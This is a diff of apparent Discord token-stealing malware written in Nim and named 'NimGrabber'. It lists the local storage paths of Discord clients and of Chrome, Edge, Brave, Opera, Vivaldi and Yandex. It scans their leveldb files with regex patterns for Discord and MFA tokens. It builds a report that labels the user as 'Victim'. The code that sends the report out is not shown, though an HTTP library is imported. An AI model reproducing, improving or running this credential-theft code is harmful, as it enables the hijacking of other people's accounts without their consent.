@@ -1,8 +1,9 @@
 # ============ #
 # NullCode1337 #
 # ============ #
-import json, puppy, os, regex, strutils
+import json, puppy, os, regex, strformat
 from sequtils import deduplicate, concat
+from strutils import replace, endswith, strip
 
 # User fillable variables
 # -----------------------
@@ -20,19 +21,27 @@ var
 let 
   roaming = getenv("appdata")
   local   = getenv("localappdata")
-  begin: string = "<@" & $userid & "> \nVictim: **" & "username".getenv & "**\n\n**__Tokens grabbed by NimGrabber__**: \n"
-  reg     = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]
+  begin = &"<@{userid}> Victim: **{\"username\".getenv}**\n**__Tokens grabbed by NimGrabber__**:\n"
+   
+  paths = [
+    roaming / "Discord", 
+    roaming / "discordcanary", 
+    roaming / "Lightcord",
+    roaming / "discordptb",
+    roaming / "Opera Software" / "Opera Stable",
+    roaming / "Opera Software" / "Opera GX Stable",
+    local / "Vivaldi" / "User Data" / "Default",       
+    local / "Microsoft" / "Edge" / "User Data" / "Default",  
+    local / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
+    local / "Google" / "Chrome" / "User Data" / "Default",
+    local / "Yandex" / "YandexBrowser" / "User Data" / "Default", 
+  ]
   
-  paths = [roaming & r"\Discord",               roaming & r"\discordptb",     roaming & r"\discordcanary",
-  roaming & r"\Lightcord",                      local & r"\Google\Chrome\User Data\Default",
-  local & r"\Microsoft\Edge\User Data\Default", roaming & r"\Opera Software\Opera Stable",
-  roaming & r"\Opera Software\Opera GX Stable", local & r"\BraveSoftware\Brave-Browser\User Data\Default",
-  local & r"\Vivaldi\User Data\Default",        local & r"\Yandex\YandexBrowser\User Data\Default"]
+const reg = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]
 
 for path in paths:
    var path = path & r"\Local Storage\leveldb"
    if dirExists(path):
-   
       try: ## Stage 1: Finding paths for all the files
          setCurrentDir(path)
          for file in walkDirRec path:
@@ -49,7 +58,6 @@ for path in paths:
          for r in reg:
             for f in findAll(cont, r):
                tokens.add cont[f.boundaries]
-               
    else: continue
 
 if tokens.len == 0: ## Just in case no token ever gets found 
